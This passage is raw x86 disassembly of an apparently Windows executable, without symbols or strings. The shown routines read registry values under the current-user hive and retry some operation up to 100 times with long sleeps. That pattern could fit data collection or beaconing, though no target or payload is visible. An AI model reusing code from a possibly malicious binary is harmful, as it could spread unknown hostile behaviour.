  404faa:	e8 62 05 00 00       	call   0x405511
  404faf:	8b 45 0c             	mov    0xc(%ebp),%eax
  404fb2:	59                   	pop    %ecx
  404fb3:	8b 08                	mov    (%eax),%ecx
  404fb5:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404fb8:	52                   	push   %edx
  404fb9:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404fbc:	52                   	push   %edx
  404fbd:	50                   	push   %eax
  404fbe:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  404fc4:	85 c0                	test   %eax,%eax
  404fc6:	75 0d                	jne    0x404fd5
  404fc8:	8b 75 dc             	mov    -0x24(%ebp),%esi
  404fcb:	e8 c8 75 00 00       	call   0x40c598
  404fd0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404fd3:	eb 03                	jmp    0x404fd8
  404fd5:	89 7d f0             	mov    %edi,-0x10(%ebp)
  404fd8:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404fdb:	53                   	push   %ebx
  404fdc:	50                   	push   %eax
  404fdd:	ba 94 e6 40 00       	mov    $0x40e694,%edx
  404fe2:	e8 2a 05 00 00       	call   0x405511
  404fe7:	8b 45 0c             	mov    0xc(%ebp),%eax
  404fea:	59                   	pop    %ecx
  404feb:	8b 08                	mov    (%eax),%ecx
  404fed:	8d 55 e8             	lea    -0x18(%ebp),%edx
  404ff0:	52                   	push   %edx
  404ff1:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  404ff4:	52                   	push   %edx
  404ff5:	50                   	push   %eax
  404ff6:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  404ffc:	85 c0                	test   %eax,%eax
  404ffe:	75 0c                	jne    0x40500c
  405000:	8b 75 e8             	mov    -0x18(%ebp),%esi
  405003:	e8 90 75 00 00       	call   0x40c598
  405008:	8b d8                	mov    %eax,%ebx
  40500a:	eb 02                	jmp    0x40500e
  40500c:	33 db                	xor    %ebx,%ebx
  40500e:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405011:	50                   	push   %eax
  405012:	ba e0 e4 40 00       	mov    $0x40e4e0,%edx
  405017:	e8 f5 04 00 00       	call   0x405511
  40501c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40501f:	59                   	pop    %ecx
  405020:	8b 08                	mov    (%eax),%ecx
  405022:	8d 55 e0             	lea    -0x20(%ebp),%edx
  405025:	52                   	push   %edx
  405026:	8d 55 a0             	lea    -0x60(%ebp),%edx
  405029:	52                   	push   %edx
  40502a:	50                   	push   %eax
  40502b:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  405031:	85 c0                	test   %eax,%eax
  405033:	75 0d                	jne    0x405042
  405035:	8b 75 e0             	mov    -0x20(%ebp),%esi
  405038:	e8 5b 75 00 00       	call   0x40c598
  40503d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405040:	eb 03                	jmp    0x405045
  405042:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405045:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405048:	3b c7                	cmp    %edi,%eax
  40504a:	0f 84 a3 00 00 00    	je     0x4050f3
  405050:	66 39 38             	cmp    %di,(%eax)
  405053:	0f 84 9a 00 00 00    	je     0x4050f3
  405059:	3b df                	cmp    %edi,%ebx
  40505b:	0f 84 92 00 00 00    	je     0x4050f3
  405061:	66 39 3b             	cmp    %di,(%ebx)
  405064:	0f 84 89 00 00 00    	je     0x4050f3
  40506a:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  40506d:	0f 84 80 00 00 00    	je     0x4050f3
  405073:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405076:	e8 b9 fa ff ff       	call   0x404b34
  40507b:	85 c0                	test   %eax,%eax
  40507d:	7e 74                	jle    0x4050f3
  40507f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405082:	85 c0                	test   %eax,%eax
  405084:	74 09                	je     0x40508f
  405086:	e8 09 71 00 00       	call   0x40c194
  40508b:	8b f0                	mov    %eax,%esi
  40508d:	eb 02                	jmp    0x405091
  40508f:	33 f6                	xor    %esi,%esi
  405091:	83 fe 01             	cmp    $0x1,%esi
  405094:	72 08                	jb     0x40509e
  405096:	81 fe ff ff 00 00    	cmp    $0xffff,%esi
  40509c:	76 03                	jbe    0x4050a1
  40509e:	6a 15                	push   $0x15
  4050a0:	5e                   	pop    %esi
  4050a1:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4050a5:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4050ab:	50                   	push   %eax
  4050ac:	ba 60 e9 40 00       	mov    $0x40e960,%edx
  4050b1:	e8 5b 04 00 00       	call   0x405511
  4050b6:	56                   	push   %esi
  4050b7:	ff 75 f8             	push   -0x8(%ebp)
  4050ba:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4050c0:	ff 75 fc             	push   -0x4(%ebp)
  4050c3:	53                   	push   %ebx
  4050c4:	50                   	push   %eax
  4050c5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4050c8:	50                   	push   %eax
  4050c9:	e8 6f 73 00 00       	call   0x40c43d
  4050ce:	83 c4 1c             	add    $0x1c,%esp
  4050d1:	85 c0                	test   %eax,%eax
  4050d3:	7e 15                	jle    0x4050ea
  4050d5:	8b 75 10             	mov    0x10(%ebp),%esi
  4050d8:	ff 75 f4             	push   -0xc(%ebp)
  4050db:	8b ce                	mov    %esi,%ecx
  4050dd:	e8 29 6f 00 00       	call   0x40c00b
  4050e2:	84 c0                	test   %al,%al
  4050e4:	59                   	pop    %ecx
  4050e5:	74 03                	je     0x4050ea
  4050e7:	ff 46 04             	incl   0x4(%esi)
  4050ea:	ff 75 f4             	push   -0xc(%ebp)
  4050ed:	e8 48 6d 00 00       	call   0x40be3a
  4050f2:	59                   	pop    %ecx
  4050f3:	ff 75 f8             	push   -0x8(%ebp)
  4050f6:	e8 be 74 00 00       	call   0x40c5b9
  4050fb:	ff 75 f0             	push   -0x10(%ebp)
  4050fe:	e8 b6 74 00 00       	call   0x40c5b9
  405103:	53                   	push   %ebx
  405104:	e8 b0 74 00 00       	call   0x40c5b9
  405109:	ff 75 fc             	push   -0x4(%ebp)
  40510c:	e8 a8 74 00 00       	call   0x40c5b9
  405111:	8b 75 d8             	mov    -0x28(%ebp),%esi
  405114:	83 c4 10             	add    $0x10,%esp
  405117:	5b                   	pop    %ebx
  405118:	ff 75 ec             	push   -0x14(%ebp)
  40511b:	e8 99 74 00 00       	call   0x40c5b9
  405120:	59                   	pop    %ecx
  405121:	8b 45 0c             	mov    0xc(%ebp),%eax
  405124:	8b 08                	mov    (%eax),%ecx
  405126:	50                   	push   %eax
  405127:	ff 51 08             	call   *0x8(%ecx)
  40512a:	8b 06                	mov    (%esi),%eax
  40512c:	56                   	push   %esi
  40512d:	ff 50 08             	call   *0x8(%eax)
  405130:	5f                   	pop    %edi
  405131:	b0 01                	mov    $0x1,%al
  405133:	5e                   	pop    %esi
  405134:	c9                   	leave
  405135:	c3                   	ret
  405136:	55                   	push   %ebp
  405137:	8b ec                	mov    %esp,%ebp
  405139:	81 ec 3c 05 00 00    	sub    $0x53c,%esp
  40513f:	53                   	push   %ebx
  405140:	56                   	push   %esi
  405141:	57                   	push   %edi
  405142:	6a 08                	push   $0x8
  405144:	33 f6                	xor    %esi,%esi
  405146:	56                   	push   %esi
  405147:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40514a:	50                   	push   %eax
  40514b:	e8 4d 6d 00 00       	call   0x40be9d
  405150:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  405156:	50                   	push   %eax
  405157:	ba 70 e4 40 00       	mov    $0x40e470,%edx
  40515c:	e8 b0 03 00 00       	call   0x405511
  405161:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  405167:	50                   	push   %eax
  405168:	ba e8 e3 40 00       	mov    $0x40e3e8,%edx
  40516d:	e8 9f 03 00 00       	call   0x405511
  405172:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405175:	50                   	push   %eax
  405176:	ba 44 e4 40 00       	mov    $0x40e444,%edx
  40517b:	e8 91 03 00 00       	call   0x405511
  405180:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405183:	50                   	push   %eax
  405184:	ba d4 e3 40 00       	mov    $0x40e3d4,%edx
  405189:	e8 83 03 00 00       	call   0x405511
  40518e:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  405194:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405197:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  40519d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4051a0:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4051a3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4051a6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4051a9:	83 c4 10             	add    $0x10,%esp
  4051ac:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4051af:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4051b6:	bb 04 01 00 00       	mov    $0x104,%ebx
  4051bb:	53                   	push   %ebx
  4051bc:	ff 74 35 ec          	push   -0x14(%ebp,%esi,1)
  4051c0:	8d bd d0 fc ff ff    	lea    -0x330(%ebp),%edi
  4051c6:	ff 74 35 e4          	push   -0x1c(%ebp,%esi,1)
  4051ca:	b8 01 00 00 80       	mov    $0x80000001,%eax
  4051cf:	e8 bb 32 00 00       	call   0x40848f
  4051d4:	83 c4 0c             	add    $0xc,%esp
  4051d7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051da:	74 27                	je     0x405203
  4051dc:	85 c0                	test   %eax,%eax
  4051de:	76 23                	jbe    0x405203
  4051e0:	53                   	push   %ebx
  4051e1:	8d 85 c8 fa ff ff    	lea    -0x538(%ebp),%eax
  4051e7:	50                   	push   %eax
  4051e8:	8b c7                	mov    %edi,%eax
  4051ea:	50                   	push   %eax
  4051eb:	ff 15 7c e0 40 00    	call   *0x40e07c
  4051f1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4051f4:	50                   	push   %eax
  4051f5:	8d 85 c8 fa ff ff    	lea    -0x538(%ebp),%eax
  4051fb:	50                   	push   %eax
  4051fc:	e8 7a fc ff ff       	call   0x404e7b
  405201:	59                   	pop    %ecx
  405202:	59                   	pop    %ecx
  405203:	83 c6 04             	add    $0x4,%esi
  405206:	ff 4d fc             	decl   -0x4(%ebp)
  405209:	75 b0                	jne    0x4051bb
  40520b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40520f:	76 0a                	jbe    0x40521b
  405211:	8b 75 f4             	mov    -0xc(%ebp),%esi
  405214:	e8 87 e1 ff ff       	call   0x4033a0
  405219:	eb 09                	jmp    0x405224
  40521b:	ff 75 f4             	push   -0xc(%ebp)
  40521e:	e8 17 6c 00 00       	call   0x40be3a
  405223:	59                   	pop    %ecx
  405224:	5f                   	pop    %edi
  405225:	5e                   	pop    %esi
  405226:	5b                   	pop    %ebx
  405227:	c9                   	leave
  405228:	c3                   	ret
  405229:	55                   	push   %ebp
  40522a:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  40522e:	b8 cc 38 00 00       	mov    $0x38cc,%eax
  405233:	e8 78 83 00 00       	call   0x40d5b0
  405238:	53                   	push   %ebx
  405239:	56                   	push   %esi
  40523a:	57                   	push   %edi
  40523b:	e8 0d 06 00 00       	call   0x40584d
  405240:	99                   	cltd
  405241:	be e8 03 00 00       	mov    $0x3e8,%esi
  405246:	8b ce                	mov    %esi,%ecx
  405248:	f7 f9                	idiv   %ecx
  40524a:	33 ff                	xor    %edi,%edi
  40524c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40524f:	8b ca                	mov    %edx,%ecx
  405251:	3b cf                	cmp    %edi,%ecx
  405253:	75 0c                	jne    0x405261
  405255:	66 c7 45 ac 30 00    	movw   $0x30,-0x54(%ebp)
  40525b:	66 89 7d ae          	mov    %di,-0x52(%ebp)
  40525f:	eb 05                	jmp    0x405266
  405261:	e8 93 04 00 00       	call   0x4056f9
  405266:	8d 8d ac ef ff ff    	lea    -0x1054(%ebp),%ecx
  40526c:	51                   	push   %ecx
  40526d:	8b d0                	mov    %eax,%edx
  40526f:	e8 9d 02 00 00       	call   0x405511
  405274:	59                   	pop    %ecx
  405275:	b9 38 e3 40 00       	mov    $0x40e338,%ecx
  40527a:	8d 85 ac ef ff ff    	lea    -0x1054(%ebp),%eax
  405280:	e8 68 02 00 00       	call   0x4054ed
  405285:	e8 c3 05 00 00       	call   0x40584d
  40528a:	99                   	cltd
  40528b:	f7 fe                	idiv   %esi
  40528d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405290:	8b ca                	mov    %edx,%ecx
  405292:	3b cf                	cmp    %edi,%ecx
  405294:	75 0c                	jne    0x4052a2
  405296:	66 c7 45 ac 30 00    	movw   $0x30,-0x54(%ebp)
  40529c:	66 89 7d ae          	mov    %di,-0x52(%ebp)
  4052a0:	eb 05                	jmp    0x4052a7
  4052a2:	e8 52 04 00 00       	call   0x4056f9
  4052a7:	8b c8                	mov    %eax,%ecx
  4052a9:	8d 85 ac ef ff ff    	lea    -0x1054(%ebp),%eax
  4052af:	e8 39 02 00 00       	call   0x4054ed
  4052b4:	b9 3c e3 40 00       	mov    $0x40e33c,%ecx
  4052b9:	e8 2f 02 00 00       	call   0x4054ed
  4052be:	8d 85 ac f7 ff ff    	lea    -0x854(%ebp),%eax
  4052c4:	50                   	push   %eax
  4052c5:	ba 88 e9 40 00       	mov    $0x40e988,%edx
  4052ca:	e8 42 02 00 00       	call   0x405511
  4052cf:	59                   	pop    %ecx
  4052d0:	b9 68 e3 40 00       	mov    $0x40e368,%ecx
  4052d5:	8d 85 ac f7 ff ff    	lea    -0x854(%ebp),%eax
  4052db:	e8 0d 02 00 00       	call   0x4054ed
  4052e0:	8d 5d ac             	lea    -0x54(%ebp),%ebx
  4052e3:	e8 66 28 00 00       	call   0x407b4e
  4052e8:	8b cb                	mov    %ebx,%ecx
  4052ea:	8d 85 ac f7 ff ff    	lea    -0x854(%ebp),%eax
  4052f0:	e8 f8 01 00 00       	call   0x4054ed
  4052f5:	57                   	push   %edi
  4052f6:	50                   	push   %eax
  4052f7:	e8 55 01 00 00       	call   0x405451
  4052fc:	59                   	pop    %ecx
  4052fd:	50                   	push   %eax
  4052fe:	8d 85 ac f7 ff ff    	lea    -0x854(%ebp),%eax
  405304:	50                   	push   %eax
  405305:	be 68 4f 41 00       	mov    $0x414f68,%esi
  40530a:	8b c6                	mov    %esi,%eax
  40530c:	e8 31 1a 00 00       	call   0x406d42
  405311:	8d 85 ac e7 ff ff    	lea    -0x1854(%ebp),%eax
  405317:	50                   	push   %eax
  405318:	ba 74 e3 40 00       	mov    $0x40e374,%edx
  40531d:	e8 ef 01 00 00       	call   0x405511
  405322:	83 c4 10             	add    $0x10,%esp
  405325:	8b ce                	mov    %esi,%ecx
  405327:	8d 85 ac e7 ff ff    	lea    -0x1854(%ebp),%eax
  40532d:	e8 bb 01 00 00       	call   0x4054ed
  405332:	b9 84 e3 40 00       	mov    $0x40e384,%ecx
  405337:	e8 b1 01 00 00       	call   0x4054ed
  40533c:	b9 8c e3 40 00       	mov    $0x40e38c,%ecx
  405341:	e8 a7 01 00 00       	call   0x4054ed
  405346:	8d 8d ac f7 ff ff    	lea    -0x854(%ebp),%ecx
  40534c:	e8 9c 01 00 00       	call   0x4054ed
  405351:	39 3d e4 14 41 00    	cmp    %edi,0x4114e4
  405357:	8b 3d 70 e0 40 00    	mov    0x40e070,%edi
  40535d:	75 13                	jne    0x405372
  40535f:	eb 07                	jmp    0x405368
  405361:	68 10 27 00 00       	push   $0x2710
  405366:	ff d7                	call   *%edi
  405368:	e8 a7 19 00 00       	call   0x406d14
  40536d:	83 f8 01             	cmp    $0x1,%eax
  405370:	75 ef                	jne    0x405361
  405372:	33 f6                	xor    %esi,%esi
  405374:	89 75 74             	mov    %esi,0x74(%ebp)
  405377:	83 fe 04             	cmp    $0x4,%esi
  40537a:	75 09                	jne    0x405385
  40537c:	68 40 9c 00 00       	push   $0x9c40
  405381:	33 f6                	xor    %esi,%esi
  405383:	ff d7                	call   *%edi
  405385:	8b 14 b5 20 10 41 00 	mov    0x411020(,%esi,4),%edx
  40538c:	8d 85 ac c7 ff ff    	lea    -0x3854(%ebp),%eax
  405392:	50                   	push   %eax
  405393:	8d 85 ac e7 ff ff    	lea    -0x1854(%ebp),%eax
  405399:	50                   	push   %eax
  40539a:	8d 85 ac ef ff ff    	lea    -0x1054(%ebp),%eax
  4053a0:	50                   	push   %eax
  4053a1:	e8 4e 4a 00 00       	call   0x409df4
  4053a6:	8b d8                	mov    %eax,%ebx
  4053a8:	83 c4 0c             	add    $0xc,%esp
  4053ab:	85 db                	test   %ebx,%ebx
  4053ad:	74 1c                	je     0x4053cb
  4053af:	83 c8 ff             	or     $0xffffffff,%eax
  4053b2:	ba 44 ec 40 00       	mov    $0x40ec44,%edx
  4053b7:	8d 8d ac c7 ff ff    	lea    -0x3854(%ebp),%ecx
  4053bd:	e8 b6 6f 00 00       	call   0x40c378
  4053c2:	33 db                	xor    %ebx,%ebx
  4053c4:	85 c0                	test   %eax,%eax
  4053c6:	75 03                	jne    0x4053cb
  4053c8:	43                   	inc    %ebx
  4053c9:	eb 07                	jmp    0x4053d2
  4053cb:	68 20 4e 00 00       	push   $0x4e20
  4053d0:	ff d7                	call   *%edi
  4053d2:	ff 45 74             	incl   0x74(%ebp)
  4053d5:	46                   	inc    %esi
  4053d6:	85 db                	test   %ebx,%ebx
  4053d8:	75 06                	jne    0x4053e0
  4053da:	83 7d 74 64          	cmpl   $0x64,0x74(%ebp)
  4053de:	7c 97                	jl     0x405377
  4053e0:	5f                   	pop    %edi
  4053e1:	5e                   	pop    %esi
  4053e2:	8b c3                	mov    %ebx,%eax
  4053e4:	5b                   	pop    %ebx
  4053e5:	83 c5 78             	add    $0x78,%ebp
  4053e8:	c9                   	leave
  4053e9:	c3                   	ret
  4053ea:	55                   	push   %ebp
  4053eb:	8b ec                	mov    %esp,%ebp
  4053ed:	83 e4 f8             	and    $0xfffffff8,%esp
  4053f0:	6a 00                	push   $0x0
  4053f2:	68 00 00 10 00       	push   $0x100000
  4053f7:	6a 00                	push   $0x0
  4053f9:	ff 15 40 e0 40 00    	call   *0x40e040
  4053ff:	85 c0                	test   %eax,%eax
  405401:	a3 a0 3e 42 00       	mov    %eax,0x423ea0
  405406:	75 14                	jne    0x40541c
  405408:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40540e:	a3 a0 3e 42 00       	mov    %eax,0x423ea0
  405413:	c6 05 a4 3e 42 00 00 	movb   $0x0,0x423ea4
  40541a:	eb 07                	jmp    0x405423
  40541c:	c6 05 a4 3e 42 00 01 	movb   $0x1,0x423ea4
  405423:	e8 18 e3 ff ff       	call   0x403740
  405428:	e8 e3 e7 ff ff       	call   0x403c10
  40542d:	e8 b5 ec ff ff       	call   0x4040e7
  405432:	e8 ad ed ff ff       	call   0x4041e4
  405437:	e8 df f0 ff ff       	call   0x40451b
  40543c:	e8 51 f6 ff ff       	call   0x404a92
  405441:	e8 f0 fc ff ff       	call   0x405136
  405446:	e8 de fd ff ff       	call   0x405229
  40544b:	33 c0                	xor    %eax,%eax
  40544d:	8b e5                	mov    %ebp,%esp
  40544f:	5d                   	pop    %ebp
  405450:	c3                   	ret
  405451:	8b 44 24 04          	mov    0x4(%esp),%eax
  405455:	66 8b 08             	mov    (%eax),%cx
  405458:	40                   	inc    %eax
  405459:	40                   	inc    %eax
  40545a:	66 85 c9             	test   %cx,%cx
  40545d:	75 f6                	jne    0x405455
  40545f:	2b 44 24 04          	sub    0x4(%esp),%eax
  405463:	d1 f8                	sar    $1,%eax
  405465:	48                   	dec    %eax
  405466:	c3                   	ret
  405467:	56                   	push   %esi
  405468:	57                   	push   %edi
  405469:	8b f0                	mov    %eax,%esi
  40546b:	eb 09                	jmp    0x405476
  40546d:	66 85 c9             	test   %cx,%cx
  405470:	74 11                	je     0x405483
  405472:	42                   	inc    %edx
  405473:	42                   	inc    %edx
  405474:	46                   	inc    %esi
  405475:	46                   	inc    %esi
  405476:	0f b7 0e             	movzwl (%esi),%ecx
  405479:	0f b7 02             	movzwl (%edx),%eax
  40547c:	0f b7 f9             	movzwl %cx,%edi
  40547f:	2b c7                	sub    %edi,%eax
  405481:	74 ea                	je     0x40546d
  405483:	85 c0                	test   %eax,%eax
  405485:	5f                   	pop    %edi
  405486:	5e                   	pop    %esi
  405487:	7d 04                	jge    0x40548d
  405489:	83 c8 ff             	or     $0xffffffff,%eax
  40548c:	c3                   	ret
  40548d:	7e 03                	jle    0x405492
  40548f:	33 c0                	xor    %eax,%eax
  405491:	40                   	inc    %eax
  405492:	c3                   	ret
  405493:	53                   	push   %ebx
  405494:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405498:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  40549c:	57                   	push   %edi
  40549d:	8b f8                	mov    %eax,%edi
  40549f:	74 45                	je     0x4054e6
  4054a1:	0f b7 08             	movzwl (%eax),%ecx
  4054a4:	66 85 c9             	test   %cx,%cx
  4054a7:	74 3b                	je     0x4054e4
  4054a9:	0f b7 d1             	movzwl %cx,%edx
  4054ac:	2b c3                	sub    %ebx,%eax
  4054ae:	66 85 d2             	test   %dx,%dx
  4054b1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4054b5:	74 1b                	je     0x4054d2
  4054b7:	0f b7 11             	movzwl (%ecx),%edx
  4054ba:	66 85 d2             	test   %dx,%dx
  4054bd:	74 2a                	je     0x4054e9
  4054bf:	0f b7 1c 08          	movzwl (%eax,%ecx,1),%ebx
  4054c3:	0f b7 d2             	movzwl %dx,%edx
  4054c6:	2b da                	sub    %edx,%ebx
  4054c8:	75 08                	jne    0x4054d2
  4054ca:	41                   	inc    %ecx
  4054cb:	41                   	inc    %ecx
  4054cc:	66 39 1c 08          	cmp    %bx,(%eax,%ecx,1)
  4054d0:	75 e5                	jne    0x4054b7
  4054d2:	66 83 39 00          	cmpw   $0x0,(%ecx)
  4054d6:	74 11                	je     0x4054e9
  4054d8:	47                   	inc    %edi
  4054d9:	47                   	inc    %edi
  4054da:	0f b7 17             	movzwl (%edi),%edx
  4054dd:	40                   	inc    %eax
  4054de:	40                   	inc    %eax
  4054df:	66 85 d2             	test   %dx,%dx
  4054e2:	75 ca                	jne    0x4054ae
  4054e4:	33 c0                	xor    %eax,%eax
  4054e6:	5f                   	pop    %edi
  4054e7:	5b                   	pop    %ebx
  4054e8:	c3                   	ret
  4054e9:	8b c7                	mov    %edi,%eax
  4054eb:	eb f9                	jmp    0x4054e6
  4054ed:	66 83 38 00          	cmpw   $0x0,(%eax)
  4054f1:	56                   	push   %esi
  4054f2:	8b f1                	mov    %ecx,%esi
  4054f4:	8b c8                	mov    %eax,%ecx
  4054f6:	74 08                	je     0x405500
  4054f8:	41                   	inc    %ecx
  4054f9:	41                   	inc    %ecx
  4054fa:	66 83 39 00          	cmpw   $0x0,(%ecx)
  4054fe:	75 f8                	jne    0x4054f8
  405500:	0f b7 16             	movzwl (%esi),%edx
  405503:	66 89 11             	mov    %dx,(%ecx)
  405506:	41                   	inc    %ecx
  405507:	41                   	inc    %ecx
  405508:	46                   	inc    %esi
  405509:	46                   	inc    %esi
  40550a:	66 85 d2             	test   %dx,%dx
  40550d:	75 f1                	jne    0x405500
  40550f:	5e                   	pop    %esi
  405510:	c3                   	ret
  405511:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405515:	0f b7 02             	movzwl (%edx),%eax
  405518:	66 89 01             	mov    %ax,(%ecx)
  40551b:	41                   	inc    %ecx
  40551c:	41                   	inc    %ecx
  40551d:	42                   	inc    %edx
  40551e:	42                   	inc    %edx
  40551f:	66 85 c0             	test   %ax,%ax
  405522:	75 f1                	jne    0x405515
  405524:	8b 44 24 04          	mov    0x4(%esp),%eax
  405528:	c3                   	ret
  405529:	55                   	push   %ebp
  40552a:	8b ec                	mov    %esp,%ebp
  40552c:	56                   	push   %esi
  40552d:	57                   	push   %edi
  40552e:	ba 50 e2 40 00       	mov    $0x40e250,%edx
  405533:	52                   	push   %edx
  405534:	e8 18 ff ff ff       	call   0x405451
  405539:	8b f0                	mov    %eax,%esi
  40553b:	8b 45 08             	mov    0x8(%ebp),%eax
  40553e:	52                   	push   %edx
  40553f:	e8 4f ff ff ff       	call   0x405493
  405544:	8b f8                	mov    %eax,%edi
  405546:	85 ff                	test   %edi,%edi
  405548:	59                   	pop    %ecx
  405549:	59                   	pop    %ecx
  40554a:	74 68                	je     0x4055b4
  40554c:	53                   	push   %ebx
  40554d:	ff 75 0c             	push   0xc(%ebp)
  405550:	e8 fc fe ff ff       	call   0x405451
  405555:	8b d8                	mov    %eax,%ebx
  405557:	8b d3                	mov    %ebx,%edx
  405559:	2b d6                	sub    %esi,%edx
  40555b:	8d 34 77             	lea    (%edi,%esi,2),%esi
  40555e:	56                   	push   %esi
  40555f:	e8 ed fe ff ff       	call   0x405451
  405564:	85 d2                	test   %edx,%edx
  405566:	59                   	pop    %ecx
  405567:	59                   	pop    %ecx
  405568:	8d 0c 56             	lea    (%esi,%edx,2),%ecx
  40556b:	7c 1d                	jl     0x40558a
  40556d:	8d 50 01             	lea    0x1(%eax),%edx
  405570:	85 d2                	test   %edx,%edx
  405572:	74 26                	je     0x40559a
  405574:	8d 44 51 fe          	lea    -0x2(%ecx,%edx,2),%eax
  405578:	2b f1                	sub    %ecx,%esi
  40557a:	66 8b 0c 06          	mov    (%esi,%eax,1),%cx
  40557e:	66 89 08             	mov    %cx,(%eax)
  405581:	4a                   	dec    %edx
  405582:	48                   	dec    %eax
  405583:	48                   	dec    %eax
  405584:	85 d2                	test   %edx,%edx
  405586:	75 f2                	jne    0x40557a
  405588:	eb 10                	jmp    0x40559a
  40558a:	40                   	inc    %eax
  40558b:	74 0d                	je     0x40559a
  40558d:	66 8b 16             	mov    (%esi),%dx
  405590:	66 89 11             	mov    %dx,(%ecx)
  405593:	41                   	inc    %ecx
  405594:	41                   	inc    %ecx
  405595:	46                   	inc    %esi
  405596:	46                   	inc    %esi
  405597:	48                   	dec    %eax
  405598:	75 f3                	jne    0x40558d
  40559a:	85 db                	test   %ebx,%ebx
  40559c:	76 15                	jbe    0x4055b3
  40559e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4055a1:	8b c7                	mov    %edi,%eax
  4055a3:	2b cf                	sub    %edi,%ecx
  4055a5:	8b d3                	mov    %ebx,%edx
  4055a7:	66 8b 34 01          	mov    (%ecx,%eax,1),%si
  4055ab:	66 89 30             	mov    %si,(%eax)
  4055ae:	40                   	inc    %eax
  4055af:	40                   	inc    %eax
  4055b0:	4a                   	dec    %edx
  4055b1:	75 f4                	jne    0x4055a7
  4055b3:	5b                   	pop    %ebx
  4055b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4055b7:	5f                   	pop    %edi
  4055b8:	5e                   	pop    %esi
  4055b9:	5d                   	pop    %ebp
  4055ba:	c3                   	ret
  4055bb:	66 3d 09 00          	cmp    $0x9,%ax
  4055bf:	72 06                	jb     0x4055c7
  4055c1:	66 3d 0d 00          	cmp    $0xd,%ax
  4055c5:	76 06                	jbe    0x4055cd
  4055c7:	66 3d 20 00          	cmp    $0x20,%ax
  4055cb:	75 04                	jne    0x4055d1
  4055cd:	33 c0                	xor    %eax,%eax
  4055cf:	40                   	inc    %eax
  4055d0:	c3                   	ret
  4055d1:	33 c0                	xor    %eax,%eax
  4055d3:	c3                   	ret
  4055d4:	56                   	push   %esi
  4055d5:	57                   	push   %edi
  4055d6:	8b f0                	mov    %eax,%esi
  4055d8:	33 ff                	xor    %edi,%edi
  4055da:	eb 02                	jmp    0x4055de
  4055dc:	46                   	inc    %esi
  4055dd:	46                   	inc    %esi
  4055de:	66 8b 06             	mov    (%esi),%ax
  4055e1:	e8 d5 ff ff ff       	call   0x4055bb
  4055e6:	85 c0                	test   %eax,%eax
  4055e8:	75 f2                	jne    0x4055dc
  4055ea:	0f b7 06             	movzwl (%esi),%eax
  4055ed:	66 3d 2b 00          	cmp    $0x2b,%ax
  4055f1:	74 1e                	je     0x405611
  4055f3:	66 3d 2d 00          	cmp    $0x2d,%ax
  4055f7:	75 1a                	jne    0x405613
  4055f9:	eb 16                	jmp    0x405611
  4055fb:	66 3d 30 00          	cmp    $0x30,%ax
  4055ff:	72 1f                	jb     0x405620
  405601:	66 3d 39 00          	cmp    $0x39,%ax
  405605:	77 19                	ja     0x405620
  405607:	6b ff 0a             	imul   $0xa,%edi,%edi
  40560a:	0f b7 c0             	movzwl %ax,%eax
  40560d:	8d 7c 07 d0          	lea    -0x30(%edi,%eax,1),%edi
  405611:	46                   	inc    %esi
  405612:	46                   	inc    %esi
  405613:	0f b7 06             	movzwl (%esi),%eax
  405616:	66 85 c0             	test   %ax,%ax
  405619:	75 e0                	jne    0x4055fb
  40561b:	8b c7                	mov    %edi,%eax
  40561d:	5f                   	pop    %edi
  40561e:	5e                   	pop    %esi
  40561f:	c3                   	ret
  405620:	33 c0                	xor    %eax,%eax
  405622:	eb f9                	jmp    0x40561d
  405624:	53                   	push   %ebx
  405625:	56                   	push   %esi
  405626:	33 db                	xor    %ebx,%ebx
  405628:	57                   	push   %edi
  405629:	43                   	inc    %ebx
  40562a:	8b f0                	mov    %eax,%esi
  40562c:	33 ff                	xor    %edi,%edi
  40562e:	eb 02                	jmp    0x405632
  405630:	46                   	inc    %esi
  405631:	46                   	inc    %esi
  405632:	66 8b 06             	mov    (%esi),%ax
  405635:	e8 81 ff ff ff       	call   0x4055bb
  40563a:	85 c0                	test   %eax,%eax
